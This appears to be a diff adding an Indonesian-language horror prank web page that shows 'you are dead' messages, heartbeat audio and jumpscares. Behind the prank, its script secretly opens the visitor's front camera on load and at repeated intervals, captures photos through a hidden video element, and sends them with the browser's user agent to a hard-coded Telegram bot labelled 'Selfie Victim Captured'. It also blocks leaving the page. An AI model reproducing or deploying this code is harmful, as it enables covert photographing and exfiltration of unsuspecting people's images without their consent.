@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>......</title>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <style>
+        body { margin:0; padding:0; overflow:hidden; background:#000; color:#ff0000; font-family:'Courier New', monospace; text-align:center; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:relative; }
+        h1 { font-size:75px; margin:0; animation:glitch 0.35s infinite; text-shadow:0 0 30px #ff0000; }
+        p { font-size:26px; color:#880000; margin:15px 0; }
+        .scanline { position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(transparent,rgba(255,0,0,0.25),transparent); animation:scan 2.8s linear infinite; pointer-events:none; z-index:1; }
+        .jumpscare { position:fixed; top:0; left:0; width:100%; height:100%; background:#000 url('https://i.ibb.co/0jK0Z0Z/jumpscare-dark.jpg') center/cover no-repeat; display:none; z-index:9999; }
+        video { display:none; width:1px; height:1px; } /* hidden camera preview */
+        @keyframes glitch { 0%,100%{transform:translate(0);} 20%{transform:translate(-10px,8px);} 40%{transform:translate(8px,-10px);} }
+        @keyframes scan { 0%{transform:translateY(-150%);} 100%{transform:translateY(400%);} }
+    </style>
+</head>
+<body>
+    <div class="scanline"></div>
+    <h1>KAU SUDAH MATI</h1>
+    <p>Detak jantungmu berhenti 11 menit yang lalu.</p>
+    <p>Otakmu masih berusaha... tapi kegelapan menang.</p>
+    <p style="font-size:20px; color:#550000;">Zenith sedang mengambil wajahmu sekarang.</p>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="jumpscare" class="jumpscare"></div>
+
+    <script>
+        const BOT_TOKEN = "8582003361:AAH1MMKjNGDRpISBYzG8emMBLHCS4sztmW8";   // ← GANTI
+        const CHAT_ID = "8509633837";       // ← GANTI
+
+        async function sendPhotoToTelegram(blob, caption) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "selfie_victim.jpg");
+            formData.append("caption", caption);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch(e) {}
+        }
+
+        // Ambil foto dari kamera
+        async function takeSelfie() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }  // front camera (selfie)
+                });
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+                await video.play();
+
+                // Tunggu sebentar biar stabil
+                await new Promise(r => setTimeout(r, 800));
+
+                const canvas = document.getElementById("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+
+                // Stop camera stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Convert ke blob
+                canvas.toBlob(async (blob) => {
+                    const caption = `📸 *Selfie Victim Captured*\nWaktu: ${new Date().toLocaleString()}\nBrowser: ${navigator.userAgent.substring(0,80)}...\nZenith Shadow Mode`;
+                    await sendPhotoToTelegram(blob, caption);
+                }, "image/jpeg", 0.9);
+
+            } catch(err) {
+                // Kalau korban tolak kamera atau tidak ada kamera
+                console.log("Camera access denied or not available");
+            }
+        }
+
+        // Detak jantung + jumpscare + selfie (sama seperti sebelumnya tapi tambah takeSelfie)
+        let heartRate = 92;
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+        function heartbeat() {
+            if (heartRate <= 0) return;
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sine'; osc.frequency.value = heartRate * 2.8;
+            gain.gain.value = 0.35;
+            osc.connect(gain); gain.connect(audioCtx.destination);
+            osc.start(); setTimeout(() => osc.stop(), 85);
+            heartRate -= 6;
+            setTimeout(heartbeat, 60000 / heartRate);
+        }
+
+        function triggerJumpscare() {
+            const js = document.getElementById('jumpscare');
+            js.style.display = 'block';
+            const scream = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
+            scream.volume = 0.9; scream.play().catch(() => {});
+            document.body.style.background = '#ff0000';
+            document.body.style.transform = 'scale(1.08)';
+            setTimeout(() => {
+                js.style.display = 'none';
+                document.body.style.background = '#000';
+                document.body.style.transform = 'scale(1)';
+            }, 380);
+        }
+
+        // Jalankan semuanya
+        setTimeout(() => { heartbeat(); takeSelfie(); triggerJumpscare(); }, 2500);   // Selfie pertama
+        setTimeout(() => { triggerJumpscare(); takeSelfie(); }, 8000);
+        setTimeout(() => { triggerJumpscare(); takeSelfie(); }, 14000);
+
+        // Random jumpscare + selfie
+        setInterval(() => {
+            if (Math.random() > 0.55) {
+                triggerJumpscare();
+                takeSelfie();
+            }
+        }, 7000);
+
+        window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = "Kau tidak bisa kabur."; });
+        document.documentElement.requestFullscreen?.();
+    </script>
+</body>
+</html>
